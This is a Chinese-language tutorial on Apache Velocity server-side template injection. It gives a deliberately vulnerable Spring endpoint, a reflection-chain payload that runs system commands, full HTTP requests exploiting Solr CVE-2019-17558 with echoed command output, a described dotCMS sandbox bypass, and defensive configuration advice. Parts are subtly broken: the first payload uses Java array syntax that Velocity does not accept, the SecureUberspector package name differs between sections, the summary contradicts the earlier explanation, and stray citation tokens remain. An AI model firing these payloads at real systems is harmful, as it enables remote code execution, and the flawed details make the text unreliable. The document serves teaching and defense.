## 语法：

Velocity的语法设计追求简单，与Java高度相似，学习成本低。

- **指令**：以 `#` 开头，用于控制逻辑
    ```velocity
    #set ($user = "admin")       <!-- 赋值 -->
    #if ($user == "admin")...#end  <!-- 条件判断 -->
    #foreach ($item in $list)...#end <!-- 循环 -->
    ```
- **引用**：以 `$` 开头，用于输出变量值或调用方法
    ```velocity
    $user                        <!-- 输出变量值 -->
    ${user}                      <!-- 明确变量边界 -->
    $user.name                   <!-- 属性访问 -->
    $user.getName()              <!-- 方法调用 -->
    ```

### 内省：漏洞的入口
Velocity模板中引用一个对象的方法（如 `$user.name`），引擎并非直接执行代码，而是通过 **内省（Introspection）** 机制来查找并调用对应的Java方法。

> **内省** 是一种在运行时检查和操作JavaBean属性（即getter/setter方法）的能力。它通过 `java.beans.Introspector` 类实现，是反射的一种上层封装。在Velocity中，这个机制主要由 `Uberspect` 组件负责。

## 漏洞全流程

### 第一步：存在缺陷的代码示例

```java
@PostMapping("/velocity")
public String velocity(@RequestParam String template) {
    // 初始化引擎
    VelocityEngine ve = new VelocityEngine();
    ve.setProperty(Velocity.RESOURCE_LOADER, "class");
    ve.setProperty("class.resource.loader.class", "org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader");
    ve.init();
    
    // 创建上下文，**未注入任何Java对象**
    VelocityContext context = new VelocityContext();
    
    // 用户输入直接作为模板渲染
    StringWriter writer = new StringWriter();
    ve.evaluate(context, writer, "test", template);
    return writer.toString();
}
```

**关键缺陷**：使用 `evaluate` 方法直接将用户输入作为模板执行，且上下文为空。

### 第二步：恶意Payload构造

**Velocity SSTI的核心挑战**：引擎本身不像FreeMarker那样提供 `?new` 等强大的内建函数实例化任意类。攻击者必须**利用上下文中已存在的Java对象作为跳板**，开启一条反射链。

**Payload**：

```velocity
#set ($x = "")
$x.getClass().forName("java.lang.Runtime").getMethod("exec", $x.getClass().forName("[Ljava.lang.String;")).invoke(null, new String[]{"calc"})
```

1.  `#set ($x = "")`：创建一个空字符串变量。**字符串是Velocity模板中天然存在的基础类型**，无需开发者在上下文中特意注入。
2.  `$x.getClass()`：通过字符串对象的 `getClass()` 方法获取 `java.lang.String` 的 `Class` 对象。这是开启反射链的钥匙。
3.  `.forName("java.lang.Runtime")`：通过反射加载 `Runtime` 类。
4.  `.getMethod("exec", $x.getClass().forName("[Ljava.lang.String;"))`：通过反射获取 `exec(String[])` 方法。
5.  `.invoke(null, new String[]{"calc"})`：调用 `exec` 方法执行系统命令。

### 第三步：模板解析，生成抽象语法树

Velocity使用JavaCC定义语法规则，生成解析器。当调用 `ve.evaluate()` 时，引擎会：
1.  **词法分析**：将模板字符串切分为Token（如 `#set`, `(`, `$x`）。
2.  **语法分析**：根据语法规则将Token组织成AST抽象语法树。
3.  上述Payload会被解析成以下节点结构：
    -   `ASTSetDirective`：对应 `#set` 赋值指令。
    -   `ASTReference`：对应 `$x.getClass()...` 方法链调用。
    -   `ASTMethod`：对应 `.forName(...)`, `.getMethod(...)`, `.invoke(...)` 方法调用。

### 第四步：节点执行与内省反射链

引擎从AST根节点开始，深度优先遍历并执行每个节点。

1.  **执行 `ASTSetDirective`**：将空字符串 `""` 绑定到变量 `$x`。
2.  **执行 `ASTReference`**（核心）：
    -   引擎识别到 `$x` 是一个字符串对象。
    -   通过 **`Uberspect`** 组件（默认为 `UberspectImpl`）查找 `getClass` 方法】。
    -   **内省机制**：`Uberspect` 会查找该对象所有以 `get` 开头的方法（如 `getClass()`）并缓存，然后通过反射调用 `Method.invoke()` 执行。
3.  **链式反射**：后续的 `.forName()`, `.getMethod()`, `.invoke()` 都是通过同样的内省-反射机制，在Java层面进行标准反射调用，最终执行 `Runtime.exec()`。

### 核心调用链路图

```mermaid
flowchart LR
    A[用户输入恶意模板] --> B[Velocity引擎]
    B --> C[JavaCC解析器]
    C --> D[生成AST语法树]
    D --> E[遍历并执行节点]
    E --> F[ASTReference<br/>$x.getClass...]
    F --> G[Uberspect内省机制]
    G --> H[查找getClass方法]
    H --> I[反射调用Method.invoke]
    I --> J[获取Class对象]
    J --> K[链式反射调用]
    K --> L[forName/getMethod/invoke]
    L --> M[Runtime.exec<br/>命令执行]
```



---

## 进阶绕过：沙箱限制下的利用

**攻防对抗升级**：如果开发者配置了安全内省器 `SecureUberspector`，禁用了对 `java.lang.reflect` 包的访问，上述直接的反射链会被阻断。此时，攻击者需要寻找绕过方式。

### Apache Solr CVE-2019-17558

这是一个真实案例，展示了在特定配置下，攻击者如何绕过Velocity的安全限制。

**漏洞前提**：Apache Solr集成了Velocity模板引擎（VelocityResponseWriter），并且**默认未启用** `params.resource.loader.enabled` 参数。攻击者需要两步操作：

1.  **开启参数加载器**：通过Solr的Config API，动态修改配置，启用允许从URL参数传入模板的功能。
    
    ```http
    POST /solr/demo/config HTTP/1.1
    Host: ip:8983
    Content-Type: application/json
    
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
    ```
    
2.  **注入并执行恶意模板**：在URL参数中传入包含反射链的Velocity模板，执行命令。
    
    ```http
    GET /solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
    Host: ip:8983
    ```

**Payload解析**：这个更复杂的Payload利用了 `#set` 和 `#foreach` 循环来读取命令执行结果的输出流，实现了**带回显的命令执行**。

### 沙箱逃逸：CVE-2025-11165（dotCMS案例）

这是一个2026年披露的新漏洞，展示了 `SecureUberspector` 本身可能存在的缺陷。

**漏洞原理**：在dotCMS的Velocity scripting引擎（VTools）中，认证用户（具有脚本权限）可以**动态修改Velocity引擎的运行时配置**，并重新初始化 `Uberspect` 组件。通过清空 `introspector.restrict.classes` 和 `introspector.restrict.packages` 黑名单，可以完全绕过 `SecureUberspector` 的保护。

**攻击流程**：
1.  攻击者通过脚本接口，修改Velocity运行时配置，移除反射限制。
2.  触发 `Uberspect` 重新初始化，加载新的（无限制的）安全配置。
3.  此时，攻击者可以自由访问 `java.lang.Runtime` 等危险类，实现RCE。

> ⚠️ **教训**：沙箱配置并非一劳永逸，需要确保运行时配置不被恶意修改。

---

## 防御：多层级安全体系

Velocity SSTI的防御需要从引擎配置和应用架构两个层面入手。

### 1. 引擎能力限制（配置沙箱）

|         攻击路径         | 防御配置                                                     | 原理说明                                                     |
| :----------------------: | :----------------------------------------------------------- | :----------------------------------------------------------- |
| 通过内省进行链式反射调用 | `runtime.introspector.uberspect=org.apache.velocity.engine.introspection.SecureUberspector` | 替换默认的 `UberspectImpl` 为安全版本，通过黑名单限制访问 `java.lang.reflect` 等危险包下的类【turn0search20】【turn0search29】 |
|   通过预置变量直接执行   | 审查上下文，避免注入不必要对象                               | 防止攻击者利用已有对象作为跳板                               |
|    通过解包获取底层类    | 配置 `introspector.restrict.packages` 和 `introspector.restrict.classes` | 扩展黑名单，将 `java.lang.Runtime`, `java.lang.ProcessBuilder` 等加入限制列表【turn0search20】 |

**关键配置示例**：
```properties
# 使用安全内省器
runtime.introspector.uberspect = org.apache.velocity.util.introspection.SecureUberspector

# 配置黑名单包（默认已包含 java.lang.reflect）
introspector.restrict.packages = java.lang.reflect, java.lang, sun.misc

# 配置黑名单类
introspector.restrict.classes = java.lang.Runtime, java.lang.ProcessBuilder, java.lang.Thread
```

### 2. 应用架构设计（根本防御）

1.  **分离模板与数据**：与FreeMarker防御类似，这是最根本的解决方案。编写静态模板文件（如 `index.vm`），用户输入仅通过 `context.put()` 作为**数据**传递给模板。
    ```java
    // 安全做法：预定义模板文件
    Template template = ve.getTemplate("templates/user.vm");
    // 用户输入作为数据
    context.put("username", username);
    template.merge(context, writer);
    ```

2.  **避免直接渲染用户输入**：**永远不要**将用户直接输入作为模板字符串传递给 `evaluate()`、`evaluate()` 或 `merge()` 方法。
    ```java
    // 危险：绝对禁止
    ve.evaluate(context, writer, "test", userInput);
    
    // 安全：使用预编译模板
    Template t = ve.getTemplate("safe.vm");
    t.merge(context, writer);
    ```

3.  **最小权限原则**：向模板上下文注入的Java对象应**功能最小化**，仅为必要的展示逻辑提供数据，避免注入包含危险方法的服务层或工具类对象。

4.  **安全配置审计**：定期审查Velocity的配置文件（`velocity.properties`），确保安全相关配置（如 `SecureUberspector`、黑名单）已启用且未被意外修改。

---

## 总结：Velocity SSTI的核心要点

1.  **入口点不同**：Velocity SSTI**必须依赖上下文中注入的Java对象**作为反射起点，而FreeMarker可以通过 `?new` 。
2.  **机制名称不同**：Velocity使用 **“内省 (Introspection)”** 作为反射的封装层，核心组件是 `Uberspect`；FreeMarker使用内建函数和类解析器。
3.  **防御配置不同**：Velocity的防御核心是配置 `SecureUberspector` 和扩展反射黑名单；FreeMarker是配置 `TemplateClassResolver`。
4.  **根本防御相同**：**分离模板与数据，避免直接渲染用户输入**是两款模板引擎防御SSTI的通用黄金法则。

通过理解Velocity SSTI的完整流程和防御体系，开发者可以更好地保护应用安全，攻击者也能更深入地理解Java服务端模板注入的原理。在下一篇文章中，我们可以继续探讨Thymeleaf等其他Java模板引擎的SSTI漏洞。

